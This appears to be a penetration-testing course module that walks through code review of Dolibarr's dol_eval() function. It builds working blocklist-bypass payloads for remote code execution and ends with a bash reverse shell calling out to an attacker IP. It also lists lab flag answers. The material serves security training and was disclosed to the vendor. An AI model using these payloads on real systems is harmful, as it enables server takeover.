Dolibarr Eval Filter Bypass RCE
In this Learning Module, we will cover the following Learning Units:

Getting Started
Overview of Dangerous Functions
Vulnerability Discovery
Triggering Eval
Filter Bypass Revisited
Many programming languages contain potentially and inherently dangerous functions in their core libraries or default functionality. While the exact nature of these functions varies by language, typically they manipulate memory directly, perform operations without checking memory allocation, run application code, or run OS commands.

If we discover any of these functions during source code analysis, we should try to target them, since they can provide an easy way to obtain remote code execution (RCE).

In this Learning Module, we are going to review the source code for Dolibarr, an open-source enterprise resource planning (ERP) and customer relationship management (CRM) application. We will discover that the application passes user input to a dangerous function. We'll craft an attack payload that bypasses the application's protective mechanisms and exploits the dangerous function for RCE. We'll be attacking this application as an administrative user. Our focus in this module is the mindset needed to analyze and bypass server-side validation.

The specific filter bypass payloads and techniques for Dolibarr used in this Learning Module were discovered by OffSec and were disclosed to the Dolibarr team for remediation.

11.1. Getting Started
This Learning Unit covers the following Learning Objectives:

Start and Access the Lab
Getting started with debugging
In this Learning Module, we'll use the Dolibarr VM to discover and exploit the RCE vulnerability in the Dolibarr application. This Learning Unit will cover how to start, access, and interact with the Dolibarr VM.

11.1.1. Accessing the Lab
Let's start the VM below. We should take note of the IP address.

We'll add the IP address to our /etc/hosts file on our Kali Linux VM for easier access to the Dolibarr VM and the applications running on the VM.

kali@kali:~$ sudo mousepad /etc/hosts

kali@kali:~$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

192.168.120.141  dolibarr
Listing 1 - /etc/hosts entries

We can now access the VM by hostname.

If you previously completed the Case Study: Dolibarr - The Dangers of Eval and Blocklist Validation Learning Module, make sure you only have one entry in /etc/hosts/ for the Dolibarr VM or use a different hostname for this VM. If you connected to the VM in the aforementioned module via SSH, you may need to use a different hostname or remove the previous host key from your known_hosts file to access this VM.

Let's note that we've started the Dolibarr VM in debug mode. As we'll discuss in the next section, we will have full access to the VM. However, some exercises in this module will require us to start the VM in a different configuration.

Resources
Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Dolibarr - Debug	
11.1.2. Using the Lab
Throughout this Learning Module, we will present code excerpts from files on the Dolibarr VM (dolibarr). We can also connect to the Dolibarr VM via SSH to inspect any file on the VM.

Alternatively, we can access code-server, a browser-accessible version of Visual Studio Code (VSCode), on port 8000 of the Dolibarr VM.

We'll find the relevant files on the VM at /usr/share/dolibarr/. The VM includes a preconfigured code-server workspace that we can access at http://dolibarr:8000/?workspace=/home/student/dolibarr.code-workspace. The first time we access the application, we will need to log in.

Figure 1: Accessing code-server
Figure 1: Accessing code-server
We can use the same password as we would to SSH to the server: studentlab.

After logging in, we will have access to the context of /usr/share/dolibarr/. However, code-server will display a warning message that we are accessing it in an insecure context.

Figure 2: Accessing the files in /usr/share/dolibarr with code-server
Figure 2: Accessing the files in /usr/share/dolibarr with code-server
If prompted to trust the authors of the files in VSCode, we can click Yes, I trust the authors.

In a production environment, we would not want to expose an application like code-server to the internet. In our lab, we acknowledge that this aspect is left insecure. In a real world scenario, we would be taking better measures to protect the system and application.

The Dolibarr web application is running on the VM by default. We can access the web application in our browser at http://dolibarr/dolibarr/.

Figure 3: Dolibarr login page
Figure 3: Dolibarr login page
For this Module, we will be attacking the application as an administrative user. We can log in with the username admin and the password studentlab.

11.1.3. Enabling Step Debugging
While not required for this Learning Module, we can step debug Dolibarr from code-server if we start the Dolibarr VM in debug mode. To start debugging, we need to click the Run and Debug icon on the left side panel of code-server, select Listen for XDebug (workspace) from the dropdown list, and then click the Start Debugging button.

Figure 4: Starting the Debugger
Figure 4: Starting the Debugger
We may also receive a pop-up from code-server notifying us that the application has started. We can safely ignore this.

Once the debugger is running, it will wait for a connection from the web server. We can set or remove a breakpoint in a PHP file by clicking to the left of a line number.

11.2. Overview of Dangerous Functions
This Learning Unit covers the following Learning Objectives:

Understand the basic concepts of dangerous functions
Review the eval() function in several programming languages
When we are analyzing source code, we should pay attention to dangerous functions that can lead to serious vulnerabilities. If an application passes user-supplied input to these functions, we may be able to craft malicious input to exploit them. The impact of these vulnerabilities depends on the actions the application performs and how much we know about the target application and its environment. However, most result in some form of remote code execution.

As an example, let's briefly consider the gets() function in C.

char *gets( char *str );
Listing 2 - gets() header from stdio.h

This function takes input from the user via stdin and stores it in an array (pointed to by *str). However, it does not check the length of the input or the length of the array. As a result, this function can be vulnerable to buffer overflows if the application does not implement some form of input validation and length checking.

The C11 standard revision update removed the gets() function. The revision replaced the vulnerable function with get_s(), which includes an additional argument that defines the maximum number of characters to read from stdin.

For more information on programming with C, refer to the Exploit Development Essentials Learning Path. For more information on buffer overflows, refer to the Introduction to Buffer Overflows Learning Module.

Memory allocation-based vulnerabilities are less common in the high-level programming languages used for most web applications. However, many of these languages have dangerous functions as well. We'll review some of them in the next section.

11.2.1. JavaScript eval()
JavaScript, PHP, and Python each have their own version of the eval() function. Typically, this function evaluates a string as if it is source code and returns the resulting value.

We can test out the eval() function in JavaScript directly from our browser. After opening Firefox, we'll access the JavaScript Console by opening the Web Developer Tools and then clicking the Console tab.

Figure 5: Firefox Console
Figure 5: Firefox Console
Let's start by evaluating a string containing a mathematical equation. We'll type eval("3+4"); in the Console and press I to run the code.

Figure 6: Using eval() on a string
Figure 6: Using eval() on a string
The function evaluated the contents of the string and returned the number 7.

Next, let's try evaluating a call to a different function. We'll type eval(console.log("hello eval world")); in the Console, then press I.

Figure 7: Using eval() to run console.log()
Figure 7: Using eval() to run console.log()
The function evaluated our string and executed the console.log() function. Any time an application passes improperly sanitized user input into eval(), it is an example of client-side eval injection. This attack is essentially the same as client-side cross-site scripting (XSS).

If we can pass improperly-sanitized input to a server-side eval() function or similar function, the resulting vulnerability is more severe. In most cases, we would be able to obtain remote code execution on the server.

11.2.2. PHP eval()
The official PHP documentation for eval() explains it best:

The eval() language construct is very dangerous because it allows execution of arbitrary PHP code. Its use thus is discouraged. If you have carefully verified that there is no other option than to use this construct, pay special attention not to pass any user provided data into it without properly validating it beforehand.

Let's try out the function. We'll connect to the Dolibarr VM with SSH and start an interactive PHP shell with php -a.

student@dolibarr:~$ php -a
Interactive shell

php > 
Listing 3 - Starting an interactive PHP shell

Let's try printing out the result of adding two numbers. We'll type eval("echo 3+4;"); and then press I.

php > eval("echo 3+4;");
7
Listing 4 - Using eval() to add two numbers and display the result

Our shell printed out the resulting value. Let's try using the exec() function to run whoami. We'll need to include echo in our payload for our shell to display the results. We'll type eval("echo exec('whoami');");, then press I.

php > eval("echo exec('whoami');");
student
Listing 5 - Using eval() to run "whoami" via exec()

The eval() function executed the contents of the string and displayed the results. While this example is benign, suppose we could modify the string an application passes to the eval() function. If the application lacked any input validation, we might be able to run arbitrary PHP code and take control of the server.

Developers often use functions like these because they are powerful. As someone once said, with great power comes great responsibility. These functions are difficult for developers to secure. In the case of the eval() function in PHP, it will run any string as PHP code. Developers would need to determine what should or should not be passed to it.

This is not a simple task by any means. The developers might be able to come up with a list of functions that they should block. However, they would also need to account for things like character encoding and decoding, as well as reflection and indirection techniques. We'll explore how difficult this is later on in this Learning Module.

Labs
Use PHP to eval the following string to obtain the flag.
"echo str_rot13(strrev('}00168nqrqq0p419161277n3r3qo978q9{FB'));"
Answer
OS{9d879bd3e3a772161914c0ddeda86100}
11.3. Vulnerability Discovery
This Learning Unit covers the following Learning Objectives:

Analyze the Dolibarr source code for dangerous functions
Determine the exploitability of any findings
When we review source code for vulnerabilities, one approach we can use is to search for dangerous functions. This approach starts with us identifying the sinks. If we find dangerous functions, we can trace them back and find the input source. If we can modify or control the source input, we will likely be able to exploit the dangerous function, unless there are security controls somewhere in the data flow.

In this Learning Unit, we will search the Dolibarr source code for dangerous functions and analyze any protective mechanisms that might impede exploitation.

11.3.1. Dolibarr Source Code Analysis
Let's start by accessing the Dolibarr source code in code-server by browsing to http://dolibarr:8000/?workspace=/home/student/dolibarr.code-workspace.

Figure 8: Accessing the Dolibarr source code in code-server
Figure 8: Accessing the Dolibarr source code in code-server
If we're searching for sinks, we need to have a list of dangerous functions relevant to the programming language of our application. Since Dolibarr is a PHP application, we could start by searching for functions like exec(), passthru(), system(), or shell_exec(). These functions execute external commands or programs. If the application passes unsanitized user-input to these functions, we might be able to perform command injection attacks against the application.

Let's start by searching for any uses of eval(). In code-server, we'll click the Search icon and type eval( in the Search field. We don't want to include the closing parenthesis because we are searching for any use of eval(), and we don't know what values the source code might pass to the function.

Figure 9: Searching for 'eval('
Figure 9: Searching for 'eval('
VSCode will update the results as we type. After a few moments, we should have 276 results in 101 files. Reviewing the results, there are several for a dol_eval() function. We'll keep this function in mind, but let's revise our search. We'll add a leading space to our search term, hopefully reducing the number of results to focus on just eval().

Figure 10: Refining our search results
Figure 10: Refining our search results
We've reduced the number of results to 31 instances in 14 files. This is a more manageable number of files to review. Let's check the second result at htdocs/core/lib/functions.lib.php.

The first two results are from comments documenting the dol_eval() function, which starts on line 8943.

8943  /**
8944  * Replace eval function to add more security.
8945  * This function is called by verifCond() or trans() and transnoentitiesnoconv().
8946  *
8947  * @param 	string	$s					String to evaluate
8948  * @param	int		$returnvalue		0=No return (used to execute eval($a=something)). 1=Value of eval is returned (used to eval($something)).
8949  * @param   int     $hideerrors     	1=Hide errors
8950  * @param	string	$onlysimplestring	'0' (used for computed property of extrafields)=Accept all chars, '1' (most common use)=Accept only simple string with char 'a-z0-9\s^$_+-.*>&|=!?():"\',/@';',  '2' (not used)=Accept also ';[]'
8951  * @return	mixed						Nothing or return result of eval
8952  */
8953  function dol_eval($s, $returnvalue = 0, $hideerrors = 1, $onlysimplestring = '1')
Listing 6 - Source excerpt from functions.lib.php

According to this documentation, the dol_eval() function is a secure replacement for eval(). The documentation states that the function uses the $onlysimplestring value to determine which characters to allow. We'll need to review this function further to identify how this check works, as well as any other protective controls.

Let's check the third search result in this file. In fact, it occurs within this function. We can find four calls to eval() near lines 9053 through 9061.

9051  if ($returnvalue) {
9052      if ($hideerrors) {
9053          return @eval('return '.$s.';');
9054      } else {
9055          return eval('return '.$s.';');
9056      }
9057  } else {
9058      if ($hideerrors) {
9059          @eval($s);
9060      } else {
9061          eval($s);
9062      }
9063  }
Listing 7 - eval() function calls from within dol_eval()

Each call to eval() includes the $s variable. Based on the function documentation in Listing 6, this variable contains the string to evaluate.

The at sign (@) is an error control operator. If the $hideerrors value is true, PHP will suppress error messages.

Now that we know the dol_eval() function calls eval(), let's review how many places in the application call this function. First, let's double-click on the functions.lib.php tab so that our IDE keeps the file open in a tab if we open another file. Next, we'll search for dol_eval( in code-server.

Figure 11: Searching for dol_eval(
Figure 11: Searching for dol_eval(
Our search discovered 131 results in 56 files. It's reasonable for us to conclude that this application uses this function. We'll need to further analyze this function to determine if it presents a security risk.

11.3.2. Understanding the Filter Conditions
According to the dol_eval() function documentation, the $onlysimplestring variable determines which characters the function allows. Let's review that implementation, which starts on line 8969.

8968  // Test on dangerous char (used for RCE), we allow only characters to make PHP variable testing
8969  if ($onlysimplestring == '1') {
8970      // We must accept: '1 && getDolGlobalInt("doesnotexist1") && $conf->global->MAIN_FEATURES_LEVEL'
8971      // We must accept: '$conf->barcode->enabled || preg_match(\'/^AAA/\',$leftmenu)'
8972      // We must accept: '$user->rights->cabinetmed->read && !$object->canvas=="patient@cabinetmed"'
8973      if (preg_match('/[^a-z0-9\s'.preg_quote('^$_+-.*>&|=!?():"\',/@', '/').']/i', $s)) {
8974          if ($returnvalue) {
8975              return 'Bad string syntax to evaluate (found chars that are not chars for simplestring): '.$s;
8976          } else {
8977              dol_syslog('Bad string syntax to evaluate (found chars that are not chars for simplestring): '.$s);
8978              return '';
8979          }
8980          // TODO
8981          // We can exclude all parenthesis ( that are not '($db' and 'getDolGlobalInt(' and 'getDolGlobalString(' and 'preg_match(' and 'isModEnabled('
8982          // ...
8983      }
8984  } elseif ($onlysimplestring == '2') {
8985      // We must accept: (($reloadedobj = new Task($db)) && ($reloadedobj->fetchNoCompute($object->id) > 0) && ($secondloadedobj = new Project($db)) && ($secondloadedobj->fetchNoCompute($reloadedobj->fk_project) > 0)) ? $secondloadedobj->ref : "Parent project not found"
8986      if (preg_match('/[^a-z0-9\s'.preg_quote('^$_+-.*>&|=!?():"\',/@;[]', '/').']/i', $s)) {
8987          if ($returnvalue) {
8988              return 'Bad string syntax to evaluate (found chars that are not chars for simplestring): '.$s;
8989          } else {
8990              dol_syslog('Bad string syntax to evaluate (found chars that are not chars for simplestring): '.$s);
8991              return '';
8992          }
8993      }
8994  }
Listing 8 - Code excerpt from functions.lib.php

The first thing we'll notice is that the code only checks if $onlysimplestring is 1 (line 8969) or 2 (line 8984). If the variable contains any other value, the if statement on line 8969 and elseif statement on line 8984 evaluate as false and none of this code applies. In other words, the function allows any characters if $onlysimplestring is set to any value other than 1 or 2. The function declaration defaults $onlysimplestring to 1, but there is no guard clause or fallback code to handle any other values.

The function uses regular expressions to restrict which characters it allows in the $s variable (lines 8973 and 8986). The main difference between the regex checks is that square brackets ('[' and ']') are allowed if $onlysimplestring set to 2 instead of 1.

Let's move on to the next series of checks on lines 8995 through 9021.

8995  if (is_array($s) || $s === 'Array') {
8996      return 'Bad string syntax to evaluate (value is Array) '.var_export($s, true);
8997  }
8998  if (strpos($s, '::') !== false) {
8999      if ($returnvalue) {
9000          return 'Bad string syntax to evaluate (double : char is forbidden): '.$s;
9001      } else {
9002          dol_syslog('Bad string syntax to evaluate (double : char is forbidden): '.$s);
9003          return '';
9004      }
9005  }
9006  if (strpos($s, '`') !== false) {
9007      if ($returnvalue) {
9008          return 'Bad string syntax to evaluate (backtick char is forbidden): '.$s;
9009      } else {
9010          dol_syslog('Bad string syntax to evaluate (backtick char is forbidden): '.$s);
9011          return '';
9012      }
9013  }
9014  if (preg_match('/[^0-9]+\.[^0-9]+/', $s)) {	// We refuse . if not between 2 numbers
9015      if ($returnvalue) {
9016          return 'Bad string syntax to evaluate (dot char is forbidden): '.$s;
9017      } else {
9018          dol_syslog('Bad string syntax to evaluate (dot char is forbidden): '.$s);
9019          return '';
9020      }
9021  }
Listing 9 - Code excerpt from functions.lib.php

The code above checks if the string it will evaluate ($s) contains double colons (::) on line 8998, backticks (`) on line 9006, and periods (.) that aren't between two numbers on line 9014. These characters all have special meanings in PHP.

Double colons are a scope resolution operator that can be used to access properties or methods of a class. Backticks are execution operators, which is functionally identical to calling shell_exec(). Finally, a period is a string concatenation operator. Blocking string concatenation is a good idea, since it's a common way to bypass blocklisted keywords.

Let's move on to the final series of checks, which we can find on lines 9023 through 9038.

9023  // We block use of php exec or php file functions
9024  $forbiddenphpstrings = array('$$');
9025  $forbiddenphpstrings = array_merge($forbiddenphpstrings, array('_ENV', '_SESSION', '_COOKIE', '_GET', '_POST', '_REQUEST'));
9026  
9027  $forbiddenphpfunctions = array("exec", "passthru", "shell_exec", "system", "proc_open", "popen", "eval", "dol_eval", "executeCLI", "verifCond", "base64_decode");
9028  $forbiddenphpfunctions = array_merge($forbiddenphpfunctions, array("fopen", "file_put_contents", "fputs", "fputscsv", "fwrite", "fpassthru", "require", "include", "mkdir", "rmdir", "symlink", "touch", "unlink", "umask"));
9029  $forbiddenphpfunctions = array_merge($forbiddenphpfunctions, array("function", "call_user_func"));
9030  
9031  $forbiddenphpregex = 'global\s+\$|\b('.implode('|', $forbiddenphpfunctions).')\b';
9032  
9033  do {
9034      $oldstringtoclean = $s;
9035      $s = str_ireplace($forbiddenphpstrings, '__forbiddenstring__', $s);
9036      $s = preg_replace('/'.$forbiddenphpregex.'/i', '__forbiddenstring__', $s);
9037      //$s = preg_replace('/\$[a-zA-Z0-9_\->\$]+\(/i', '', $s);	// Remove $function( call and $mycall->mymethod(
9038  } while ($oldstringtoclean != $s);
Listing 10 - Code excerpt from functions.lib.php

Lines 9024 and 9025 declare the $forbiddenphpstrings array and assign a set of values to it. The values in the array are common ways of interacting with HTTP requests.

Lines 9027 through 9029 declare the $forbiddenphpfunctions array and assign a set of values to it. These values include many of the common ways to run external commands or modify files. The list includes base64_decode, which, as its name suggests, is a function that decodes base64-encoded data.

One technique we can use to bypass any blocklist restrictions is to encode the initial payload and then decode the payload before the application runs it. In the case of this application, we might think to base64-encode a malicious call to shell_exec() and wrap it in a call to base64_decode(). The Dolibarr application's validation would prevent this attack. However, there are multiple ways to encode data, which we will discuss later in this Learning Module.

Line 9031 constructs a regular expression by imploding the $forbiddenphpfunctions array. Lines 9033 through 9038 use a do loop to replace any words in $s that match values in $forbiddenphpstrings or $forbiddenphpregex with "__forbiddenstring__".

Although it's not included in the code listing above, subsequent code checks $s for any occurrence of "__forbiddenstring__". If it finds this string, it does not run eval() on the $s variable. Instead, the function returns an error message or a blank string, depending on the value of $returnvalue.

Let's recap what we've discovered about the dol_eval() function so far during our analysis:

The function uses the value of $onlysimplestring to determine which characters it allows in $s
There cannot be double colons, backticks or periods (other than decimal points) in $s
The function uses a blocklist to remove many code execution or file functions from $s
The blocklist restricts access to the base64_decode() function, but no other forms of decoding
If the value of $s does not match any of these conditions, the function passes the string to the eval() function. While these protective controls may seem cohesive and complete, we'll craft a payload in the next section to evade them and still achieve remote code execution.

11.3.3. Filter Bypass the Hard Way
Let's determine if we can bypass the values in the blocklist and still execute arbitrary PHP code. Once we've determined what payloads we might be able to use, we can figure out what character types are needed.

We could try to find other dangerous PHP functions, but instead we'll consider ways to call functions without using their name. First, let's examine the documentation for get_defined_functions():

Gets an array of all defined functions. ... Returns a multidimensional array containing a list of all defined functions, both built-in (internal) and user-defined. The internal functions will be accessible via $arr["internal"]

If we have an array of functions, perhaps we can invoke a function based on its index value in the array. Let's familiarize ourselves with this function by connecting to the Dolibarr VM with SSH, starting an interactive PHP shell with php -a, and then invoking the function. We'll use print_r() to display the results of the get_defined_functions() call.

student@dolibarr:~$ php -a
Interactive shell

php > print_r(get_defined_functions());
Array
(
    [internal] => Array
        (
            [0] => zend_version
            [1] => func_num_args
            [2] => func_get_arg
            [3] => func_get_args
            [4] => strlen
            [5] => strcmp
            [6] => strncmp
...
            [1582] => dl
            [1583] => cli_set_process_title
            [1584] => cli_get_process_title
        )

    [user] => Array
        (
        )

)
Listing 11 - Displaying the results of get_defined_functions()

As expected based on the documentation, the function returned an array containing all the defined functions. Let's verify we can invoke a function based on its array index value. We'll try strlen(), which is at index 4 of the "internal" array based on the output above.

php > echo get_defined_functions()["internal"][4]("hello world");
11
Listing 12 - Invoking strlen() based on array index

Excellent. We invoked the strlen() function by accessing its array index in the array returned from get_defined_functions(). After reviewing the full list of values returned by get_defined_functions(), we'll find the functions we're most interested in start at index 550.

php > print_r(get_defined_functions());
Array
(
    [internal] => Array
        (
...
            [550] => exec
            [551] => system
            [552] => passthru
            [553] => escapeshellcmd
            [554] => escapeshellarg
            [555] => shell_exec
...
Listing 13 - Excerpt of get_defined_functions() results

Let's verify we can invoke exec() this way and run whoami.

php > echo get_defined_functions()["internal"][550]("whoami");
student
Listing 14 - Invoking exec() to run "whoami"

Excellent. We can invoke exec() without specifying the function name directly. We can build a payload using this approach to bypass the restrictions in the dol_eval() function.

However, there is a slight problem. We need to know the correct index value for the function we want to invoke. The Dolibarr application may import additional functions when it's running, which could change the order of the array.

We could use array_search() to search for the function we want to call. We can't use the function name since the dol_eval() function blocks those keywords. Based on our previous analysis, we know that dol_eval() also blocks base64_decode(). Fortunately for us, PHP includes native functions for several other encoding schemes, including URL-encoding.

If we URL-encode "exec", we can use the resulting value with urldecode() in our payload. However, PHP's urlencode() function only encodes non-alphanumeric characters. This is a limitation of the function, not URL-encoding in general. We can still URL-encode alphanumeric characters with a different tool, such as the Decoder tool in Burp Suite.

Let's verify the urldecode() function will still decode URL-encoded alphanumeric characters.

php > echo urldecode("%65%78%65%63");
exec
Listing 15 - Decoding URL-encoded alphanumeric characters

Excellent. Now we should be able to chain together urldecode() and array_search() to find the index of exec() in the array returned by get_defined_functions(). We'll pass the urldecode() function call to array_search() as the needle and pass get_defined_functions() as the haystack. However, we want to access the "internal" array in the get_defined_functions() results.

php > echo array_search(urldecode("%65%78%65%63"), get_defined_functions()["internal"]);
550
Listing 16 - Using array_search() to find the index of "exec"

Now that we can dynamically retrieve the index of exec(), we can build a complete payload that searches for the function and invokes it.

php > echo get_defined_functions()["internal"][array_search(urldecode("%65%78%65%63"), get_defined_functions()["internal"])]("whoami");
student
Listing 17 - Searching for and invoking exec()

We've verified that we can invoke an arbitrary function without specifying the function name. However, our payload uses square braces and percent signs.

As a reminder, the value of the $onlysimplestring parameter controls which characters are allowed. We'll need to perform more analysis to find any calls to dol_eval() with the $onlysimplestring parameter set to anything other than 1 or 2. We'll continue this analysis in the next Learning Unit.

11.4. Bypass Security Filter to Trigger Eval
This Learning Unit covers the following Learning Objectives:

Identify a vulnerable function call
Exploit Dolibarr for remote code execution
In the previous Learning Unit, we created a proof-of-concept payload that should bypass the keyword restrictions in the dol_eval() function. However, our payload contains special characters.

In this Learning Unit, we will continue our source code analysis. We'll need to find calls to dol_eval() with the $onlysimplestring parameter set to anything other than 1 or 2 for our payload to work.

11.4.1. Finding the Target
We'll return to VSCode and search code for all instances of dol_eval() with any $onlysimplestring other than 1 or 2. We'll need to use a regular expression to account for the different values passed to dol_eval() in each parameter.

dol_eval\(\$[\w\[\]']+,\s\d,\s\d,\s'(?!1|2)'\)
Listing 18 - A regular expression for searching

We want to search for the literal term "dol_eval(" followed by any variable or word, a comma, any two digits separated by a comma, and finally, any value other than 1 or 2.

We'll enter this value in the Search field and click the Use Regular Expression button (a period with an asterisk).

Figure 12: Searching for dol_eval() calls with an empty string parameter
Figure 12: Searching for dol_eval() calls with an empty string parameter
After a few moments, we'll receive three results, all from commonobject.class.php. By analyzing the search results, we can determine the insertExtraFields(), updateExtraFields(), and showOutputField() functions each contain a call to dol_eval() with an empty string for the $onlysimplestring parameter.

The documentation for the showOutputField() function states "Return HTML string to show a field into a page". This could be very useful for us. If this function returns a value which the web application then displays, we could use it to verify remote code execution with "whoami".

Let's review a few key lines from this function:

7432  /**
7433   * Return HTML string to show a field into a page
7434   * Code very similar with showOutputField of extra fields
7435   *
7436   * @param  array   $val            Array of properties of field to show
7437   * @param  string  $key            Key of attribute
7438   * @param  string  $value          Preselected value to show (for date type it must be in timestamp format, for amount or price it must be a php numeric value)
7439   * @param  string  $moreparam      To add more parametes on html input tag
7440   * @param  string  $keysuffix      Prefix string to add into name and id of field (can be used to avoid duplicate names)
7441   * @param  string  $keyprefix      Suffix string to add into name and id of field (can be used to avoid duplicate names)
7442   * @param  mixed   $morecss        Value for css to define size. May also be a numeric.
7443   * @return string
7444   */
7445  public function showOutputField($val, $key, $value, $moreparam = '', $keysuffix = '', $keyprefix = '', $morecss = '')
7446  {
...
7476      $computed = empty($val['computed']) ? '' : $val['computed'];
...
7511      // If field is a computed field, value must become result of compute
7512      if ($computed) {
7513          // Make the eval of compute string
7514          //var_dump($computed);
7515          $value = dol_eval($computed, 1, 0, '');
7516      }
...
7845      $out = $value;
7846  
7847      return $out;
7848  }
Listing 19 - Code excerpts from the showOutputField() function

We've skipped over many lines of code from this function in the listing above to focus on the main issue we are researching. The $val parameter contains an array. Line 7476 assigns the value in the array associated with the key value "computed" to the $computed variable. If this variable is not false, it is passed to the dol_eval() function on line 7515 with the result of the function stored in the $value variable.

There are many lines of code in a large if...elseif block that modify the value of the $value variable based on the value associated with the "type" key in the $val array. These lines aren't important for our current analysis.

Finally, on lines 7845 and 7847, the function returns the value that originated from the dol_eval() function call.

Let's scroll to the top of this file to understand more about this function and its class.

41  /**
42   *  Parent class of all other business classes (invoices, contracts, proposals, orders, ...)
43  */
44  abstract class CommonObject
45  {
Listing 20 - Class definition and comments for CommonObject

Based on the comment on line 42, the CommonObject class is the parent class of other business classes. The showOutputField() is a public function in the CommonObject class. Therefore, any class that inherits from CommonObject will inherit the vulnerable showOutputField() function, unless the class specifically overrides the function. We can verify other classes inherit from CommonObject by searching for extends CommonObject in code-server.

Figure 13: Searching for class that inherit from CommonObject
Figure 13: Searching for class that inherit from CommonObject
After a few moments, we receive 154 results in 130 files. Each class in the search results potentially increases the attack surface of this vulnerability.

We could continue tracing this vulnerability through the source code, but Dolibarr is highly configurable and contains a multitude of business objects. Our Dolibarr VM has the application running in its default state.

Let's log in to the application at http://dolibarr/dolibarr/index.php with the username admin and password studentlab. After logging in, we'll check which modules are enabled by clicking on Modules/Applications or browsing to http://dolibarr/dolibarr/admin/modules.php?mainmenu=home.

Figure 14: Modules setup page
Figure 14: Modules setup page
The Users & Groups module is the only one enabled by default. Let's click on the gear icon to determine what configuration options are available to us.

Figure 15: Users module setup
Figure 15: Users module setup
Clicking through the available sub-options, we'll find that the "Complementary attributes (Users)" page allows us to define custom attributes which includes "Computed field".

Figure 16: User attributes
Figure 16: User attributes
This functionality seems to match with the vulnerable functions we identified earlier. Let's click the plus (+) button to add a new attribute and then check the tooltip for the Computed field.

Figure 17: Computed Field Tooltip
Figure 17: Computed Field Tooltip
The pop-up window states we can enter "any PHP coding to get a dynamic computed value". This confirms our suspicions that this functionality likely calls dol_eval().

Let's start with a simple payload to verify the application passes this string to eval(). We'll type "test" as the Label or translation key and select "String (1 line)" for the Type. The application will set some default values, which we'll leave as is. Next, we'll type 4+7; in the Computed field.

Figure 18: Creating an Attribute with a Computed Field
Figure 18: Creating an Attribute with a Computed Field
Once we've entered those values, we'll click Save. The application returns us to the Users modules setup page, but there's no indication of whether it called the vulnerable function.

Since we created a new attribute for the User object, let's check the list of users. We can find it by clicking Users & Groups, then clicking List of users after the page reloads.

Figure 19: List of Users with 
Figure 19: List of Users with "test" Field
The list of users on the Users page includes a test column with a value of 11 in it. This is a strong indication that the application passed the value we entered in the Computed field to the dol_eval() function.

We could verify this using the debugger. If you wish to explore the application further on your own, we recommend setting breakpoints on the calls to dol_eval() from the fetch_optionals(), insertExtraFields(), setValuesForExtraLanguages(), showOptionals(), showOutputField(), and updateExtraFields() functions instead of setting a breakpoint within the dol_eval() function itself.

Let's try submitting our payload. First, we'll need to return to the Users module setup page at http://dolibarr/dolibarr/user/admin/user_extrafields.php. We can update the existing attribute by clicking the modify button (pencil icon) and then typing our payload in the Computed field.

Below is the payload we crafted earlier in this Learning Module:

get_defined_functions()["internal"][array_search(urldecode("%65%78%65%63"), get_defined_functions()["internal"])]("whoami");
Listing 21 - Exploit payload

After adding our new payload, we'll click Save. Now we can navigate back to the list of users and check the value of the "test" column.

Figure 20: List of Users Displaying the Results of Our Payload
Figure 20: List of Users Displaying the Results of Our Payload
Excellent. The "test" column displays "www-data", which indicates the application processed our payload through dol_eval(). The payload bypassed the security filters in the function. We have verified we can exploit the application's custom attribute functionality for remote code execution.

11.4.2. Getting a Reverse Shell
Now that we have a proof-of-concept payload for remote code execution, let's update it to obtain a reverse shell. We already have a framework for calling operating system commands in our payload. We can modify the value we're passing to exec() to generate a reverse shell instead of running whoami.

Let's use a bash reverse shell:

get_defined_functions()['internal'][array_search(urldecode("%65%78%65%63"), get_defined_functions()['internal'])]("/bin/bash -c 'bash -i >& /dev/tcp/192.168.48.2/9090 0>&1'");
Listing 22 - Updating the payload with a bash reverse shell

Our next steps are to start a Netcat listener to handle our reverse shell, then update the Computed field with our new payload.

kali@kali:~$ nc -nvlp 9090
listening on [any] 9090 ..
www-data@dolibarr:/usr/share/dolibarr/htdocs/user/admin$ whoami
whoami
www-data
www-data@dolibarr:/usr/share/dolibarr/htdocs/user/admin$ 
Listing 23 - Reverse shell from the Dolibarr VM

Excellent. Our payload worked and we now have a reverse shell on the Dolibarr VM.

Resources
Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Dolibarr - Exercise	
Labs
Using the Dolibarr - Exercise VM, follow the steps outlined above and get a reverse shell. The flag is located at /flag.txt. Note that VSCode is not available for this exercise.
Answer
OS{45ca43ea8a2b337fc895909ffe4a31c6}
11.5. Filter Bypass Revisted
This Learning Unit covers the following Learning Objectives:

Review other ways to bypass blocklist validation controls
We've reviewed one way to bypass the security filters and achieve remote code execution in Dolibarr. The application uses a blocklist to attempt to mitigate malicious payloads. However, this approach is inherently flawed when used with a powerful and dangerous function like eval().

As many developers know, there are several different ways to write code that performs essentially the same functionality. Since the Dolibarr application processes our payload as PHP code, we have great flexibility in how we construct our payload. In this Learning Unit, we'll review some other ways to bypass the filters in dol_eval().

While these examples are specific to PHP and Dolibarr, our mindset when analyzing restrictions is the important lesson in this Learning Module. Once we know what restrictions are in place, we need to assess what tools are available and how we can best use them given the restrictions.

11.5.1. Using Reflection
Many programming languages support reflection, which provides developers a way to modify an application programmatically at run-time. This feature allows for the creation of objects or invocation of methods.

For our purposes, we can create an instance of the ReflectionFunction class that references the exec() function. We're still limited by the restrictions in dol_eval(), so our payload can't contain the word exec in cleartext. Instead, we can use the urldecode() function again to decode a string to "exec". Once we have an instance of the ReflectionFunction, we can invoke the referenced function (which is exec() in this example) using a single arrow operator and pass in our command:

(new ReflectionFunction(urldecode('%65%78%65%63')))->invoke('whoami');
Listing 24 - Payload proof-of-concept using ReflectionFunction()

This highlights one of the issues with blocklists. Programming languages are often powerful and expressive. We can write code to perform a specific task in a number of different ways. This payload still uses several special characters, but avoids using the keywords get_defined_functions and array_search from the previous payload. However, it still uses urldecode. In the next section, we'll review a different approach to encoding to bypass the blocklist keywords.

11.5.2. Different Encodings
In addition to URL-encoding, PHP contains several built-in encoding algorithms we could use to bypass the blocklist restrictions. We could use gzip as our encoding algorithm via the gzencode() and gzdecode() functions.

PHP inexplicably includes a rot13 implementation. We could encode our intended function with str_rot13() and decode it with the same function in our payload:

(new ReflectionFunction(str_rot13('rkrp')))->invoke('whoami');
